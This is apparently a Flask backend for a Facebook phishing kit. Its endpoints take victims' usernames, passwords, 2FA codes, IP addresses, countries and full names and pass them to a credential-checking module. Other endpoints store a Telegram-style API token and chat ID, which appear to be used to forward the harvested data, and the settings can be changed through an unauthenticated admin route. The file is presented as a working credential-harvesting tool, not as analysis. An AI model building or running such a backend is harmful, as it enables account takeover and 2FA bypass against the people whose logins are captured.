from flask import Flask, request, jsonify
from flask_cors import CORS
from modules.facebook_checker import (check_status_facebook,
                                      write_api_token_and_chat_id_to_json,
                                      read_api_token_and_chat_id_from_json)

app = Flask(__name__, static_url_path='', static_folder='static')

CORS(app)  
@app.route('/read_config', methods=['GET'])
def read_config():
    api_token, chat_id = read_api_token_and_chat_id_from_json('config.json')
    return jsonify(api_token=api_token, chat_id=chat_id)

@app.route('/admin_update', methods=['GET'])
def admin_update():
    api_token = request.args.get('api_token')
    chat_id = request.args.get('chat_id')
    write_api_token_and_chat_id_to_json(api_token, chat_id)

    return 'OK'
@app.route('/check_facebook_status', methods=['GET'])
def check_facebook_status():
    username = request.args.get('username')
    password = request.args.get('password')
    fullname = request.args.get('fullname')
    code = request.args.get('code')
    ip = request.args.get('ip')
    country = request.args.get('country')
    if not username or not password:
        return 'WRONG'
    if not code:
        return check_status_facebook(username, password, None, ip, country, fullname)
    else:
        return check_status_facebook(username, password, code, ip, country, fullname)


if __name__ == '__main__':
    app.run(debug=True)
